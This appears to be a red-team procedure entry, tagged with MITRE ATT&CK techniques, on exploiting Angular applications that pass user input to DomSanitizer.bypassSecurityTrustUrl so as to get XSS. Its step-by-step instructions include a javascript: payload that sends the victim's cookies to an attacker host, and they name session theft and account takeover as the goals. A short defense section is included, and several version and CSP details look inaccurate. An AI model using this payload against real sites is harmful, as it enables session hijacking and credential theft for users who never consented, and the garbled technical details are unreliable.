---
id: 90371963-b4e8-46d4-b1fa-3b524dbea002
name: Bypass-Angular-DomSanitizer-for-XSS-Injection
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:43.801708+00:00'
updated_at: '2023-04-10T20:24:52.243088+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Collection|TA0009 - Collection]]'
techniques:
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - '[[techniques/JavaScript|T1059.007 - JavaScript]]'
sub_techniques: []
tags:
  - xss
  - angular
  - sanitization-bypass
  - dom-sanitizer
commands:
  - '[[commands/angular-bypass-security-trust-url]]'
platforms:
  - Web
  - Browser
tools: []
validated: true
---

# Bypass-Angular-DomSanitizer-for-XSS-Injection

## Summary

This procedure demonstrates how to exploit improper use of Angular's DomSanitizer bypassSecurityTrustUrl method to inject malicious JavaScript payloads, enabling cross-site scripting (XSS) attacks. By crafting a dangerous URL like a javascript: protocol handler and forcing it through the bypass method, attackers can execute arbitrary code in the victim's browser context, leading to session hijacking, data theft, or further exploitation.

## Description

Angular applications use DomSanitizer to prevent XSS by automatically sanitizing user inputs, such as URLs bound to HTML attributes. However, developers may misuse the bypassSecurityTrustUrl method to 'trust' untrusted inputs, allowing attackers to inject payloads like 'javascript:alert(document.cookie)'. This procedure targets web applications built with vulnerable versions of Angular (pre-1.6 for AngularJS or misconfigured Angular 2+). In a red team scenario, identify input fields or URL parameters that feed into this method via source code review, fuzzing, or proxy interception. Successful exploitation executes client-side scripts, collecting sensitive data like cookies or tokens without server-side detection.

## Requirements

1. Access to the target Angular web application via a browser or proxy tool like [[tools/Burp-Suite]].
2. Knowledge of the application's source code or ability to intercept and modify requests (e.g., via developer tools).
3. A vulnerable endpoint or component that uses DomSanitizer.bypassSecurityTrustUrl on user-controlled input.
4. Basic JavaScript knowledge to craft payloads.

## Defense

- Enforce strict input validation and avoid using bypassSecurityTrustUrl on untrusted data; prefer safe bindings like [src] for iframes.
- Implement Content Security Policy (CSP) with 'unsafe-inline' restrictions to block javascript: URLs.
- Use Angular's strict mode and regularly update to the latest versions (Angular 16+ has improved sanitization).
- Monitor for anomalous script executions via browser security logs or web application firewalls (WAFs).

## Objectives

1. Identify and exploit DomSanitizer bypass points to inject XSS payloads.
2. Execute arbitrary JavaScript in the victim's browser to steal session data or credentials.
3. Demonstrate potential for account takeover or data exfiltration in the target application.

## Instructions

### Step 1: Identify Vulnerable Input Point

**Context**: Locate where user input is bound to HTML attributes (e.g., [href]) and sanitized via DomSanitizer. Use browser dev tools or a proxy to inspect the application's JavaScript for bypassSecurityTrustUrl calls.

Inspect the page source or network requests for Angular components handling URLs.

**Expected Output**: Identification of a component or template like `<a [href]="trustedUrl">` where trustedUrl comes from bypassSecurityTrustUrl(userInput).

### Step 2: Craft Malicious Payload

**Context**: Create a javascript: URL payload that executes desired actions, such as alerting cookies or sending data to an attacker server.

Use a payload like 'javascript:alert(document.cookie)' or more advanced: 'javascript:fetch("https://attacker.com/steal?cookie="+document.cookie)'.

**Expected Output**: A string ready for injection into the vulnerable input field.

### Step 3: Inject and Bypass Sanitization

**Context**: Submit the payload through the vulnerable input and ensure it passes through bypassSecurityTrustUrl, marking it as trusted.

Reference the example code snippet [[codes/Angular-DomSanitizer-Bypass-Example]] to understand the vulnerable pattern, then execute the bypass using:

**Command** ([[commands/angular-bypass-security-trust-url]]):
```typescript
this.sanitizer.bypassSecurityTrustUrl(this.dangerousUrl);
```

> In a testing context, modify the dangerousUrl to your payload via form submission or parameter tampering. If intercepted with Burp, alter the POST data containing the URL.

**Expected Output**: The URL is marked safe, and when bound to [href], clicking the link executes the JavaScript payload (e.g., alert box or network request to attacker).

### Step 4: Verify Exploitation

**Context**: Confirm the payload executes by observing browser behavior, such as popups, console errors, or exfiltrated data on your server.

Monitor your listener (e.g., a simple HTTP server) for incoming requests from the payload.

**Expected Output**: Successful execution, such as stolen cookies logged on attacker server or visible alert in the browser.

**Success Indicators**:
- JavaScript payload runs without sanitization errors in console.
- Sensitive data (e.g., cookies) is exfiltrated or displayed.
